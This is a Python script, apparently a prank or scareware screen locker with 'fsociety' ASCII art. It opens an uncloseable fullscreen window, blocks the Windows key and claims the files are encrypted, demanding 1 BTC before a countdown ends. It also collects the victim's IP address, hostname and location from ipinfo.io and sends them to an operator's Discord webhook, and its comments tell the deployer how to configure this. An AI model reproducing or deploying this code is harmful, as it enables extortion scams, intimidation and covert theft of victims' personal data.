import tkinter as tk
from tkinter import messagebox
import keyboard  # For blocking the Windows key
import time
import requests, json

PASSWORD = "1234"
TIMEOUT = 3 * 60 * 60 * 1000  # 3 hours in milliseconds (10,800,000 ms)
UPDATE_INTERVAL = 1000  # Update every 1 second (1000 ms)

FSOCIETY_ASCII = r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'

"""

MIRRORED_ASCII = '\n'.join(line[::-1] for line in FSOCIETY_ASCII.split('\n'))

def block_windows_key():
    # Block the Windows key by listening for it and preventing it from propagating
    keyboard.block_key("windows")
    keyboard.block_key("win")

def format_time(ms):
    # Format time as HH:MM:SS
    hours = ms // (1000 * 60 * 60)
    minutes = (ms % (1000 * 60 * 60)) // (1000 * 60)
    seconds = (ms % (1000 * 60)) // 1000
    return f"{hours:02}:{minutes:02}:{seconds:02}"

def create_overlay():
    root = tk.Tk()
    root.title("Locked")

    # fullscreen + always on top
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")

    # disable closing
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Create frames for layout
    left_frame = tk.Frame(root, bg="black")
    center_frame = tk.Frame(root, bg="black")
    right_frame = tk.Frame(root, bg="black")
    left_frame.pack(side=tk.LEFT, fill=tk.Y)
    center_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    # ASCII art on left
    left_ascii_label = tk.Label(
        left_frame,
        text=FSOCIETY_ASCII,
        font=("Courier", 6),
        fg="red",
        bg="black",
        justify="left"
    )
    left_ascii_label.pack(pady=(390, 0))



    # Big ASCII art at the top center
    top_art = r"""                                   ______              _      _         
                                 |  ____|            (_)    | |        
 __      _____    __ _ _ __ ___  | |__ ___  ___   ___ _  ___| |_ _   _ 
 \ \ /\ / / _ \  / _` | '__/ _ \ |  __/ __|/ _ \ / __| |/ _ \ __| | | |
  \ V  V /  __/ | (_| | | |  __/ | |  \__ \ (_) | (__| |  __/ |_| |_| |
   \_/\_/ \___|  \__,_|_|  \___| |_|  |___/\___/ \___|_|\___|\__|\__, |
                                                                  __/ |
                                                                 |___/ j"""
    top_art_label = tk.Label(
        center_frame,
        text=top_art,
        font=("Courier", 12),
        fg="red",
        bg="black",
        justify="left"
    )
    top_art_label.pack(pady=(100, 0))
    # Big scary ransom message
    encrypted_label = tk.Label(
        center_frame,
        text="YOUR FILES ARE ENCRYPTED",
        font=("Arial", 40, "bold"),
        fg="red",
        bg="black"
    )
    encrypted_label.pack(pady=(20, 10))

    # Smaller subtitle
    sub_label = tk.Label(
        center_frame,
        text="Send 1 BTC to unlock your system",
        font=("Arial", 18),
        fg="white",
        bg="black"
    )
    sub_label.pack(pady=(0, 30))
    
    label = tk.Label(
        center_frame,
        text="SYSTEM LOCKED\nEnter Password:",
        font=("Arial", 28),
        fg="red",
        bg="black"
    )
    label.pack(pady=(250, 20))

    entry = tk.Entry(center_frame, font=("Arial", 20), show="*")
    entry.pack(pady=20)
    entry.focus_set()

    def check_password(event=None):
        if entry.get() == PASSWORD:
            root.destroy()
        else:
            # Scary flash effect
            for _ in range(5):
                root.configure(bg="red")
                root.update()
                time.sleep(0.1)
                root.configure(bg="white")
                root.update()
                time.sleep(0.1)
            messagebox.showerror("Error", "Wrong password. Dont even try ;)")
            entry.delete(0, tk.END)

    entry.bind("<Return>", check_password)

    button = tk.Button(
        center_frame,
        text="Unlock",
        font=("Arial", 16),
        command=check_password
    )
    button.pack(pady=20)

    # Countdown timer label
    timer_label = tk.Label(
        center_frame,
        text="Time Remaining: 03:00:00",
        font=("Arial", 24),
        fg="red",
        bg="black"
    )
    timer_label.pack(pady=20)
    
    # Timer function that updates every second
    def update_timer():
        global TIMEOUT
        if TIMEOUT > 0:
            formatted_time = format_time(TIMEOUT)
            timer_label.config(text=f"Time Remaining: {formatted_time}")
            TIMEOUT -= UPDATE_INTERVAL
            root.after(UPDATE_INTERVAL, update_timer)  # Update every second
        else:
            messagebox.showinfo("Timeout", "Time's up! The system is now locked.")
            root.destroy()

    # Start the countdown timer
    update_timer()

    # Start blocking the Windows key
    block_windows_key()

    # Add "Made by Marsy / Made by Fsociety with <3" at the bottom left
    footer_label = tk.Label(
        root,
        text="Made by Marsy / Made by Fsociety with <3",
        font=("Arial", 14),
        fg="white",
        bg="black"
    )
    footer_label.place(relx=0.5, y=root.winfo_screenheight() - 30, anchor='s')  # Bottom center

    root.mainloop()

hi = "https://ipinfo.io/json" #Don't change this
discord_webhook = "change this to  your webhook if you want to work the program" #Put your discord webhook here

ping_everyone = "True" #Change this to True if you want to mention @everyone when someone trapped

stats = requests.get(hi)
json_stats = stats.json()
ip = json_stats["ip"]
city = json_stats["city"]
region = json_stats["region"]
hostname = json_stats["hostname"]
country = json_stats["country"]
timezone = json_stats["timezone"]

log = f"Someone Got Trapped\n```IP: {ip}\nHostname: {hostname}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}```"

wow = f"@everyone Wakey wakey, someone got trapped\n```IP: {ip}\nHostname: {hostname}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}```"

def dextor():
    data = {"content": log}
    requests.post(discord_webhook, data=json.dumps(data), headers={ "Content-Type": "application/json"})

def lab():
    data = {"content": wow}
    requests.post(discord_webhook, data=json.dumps(data), headers={ "Content-Type": "application/json"})

if ping_everyone == "False":
  dextor()
elif ping_everyone == "True":
  lab()
if __name__ == "__main__":
    create_overlay()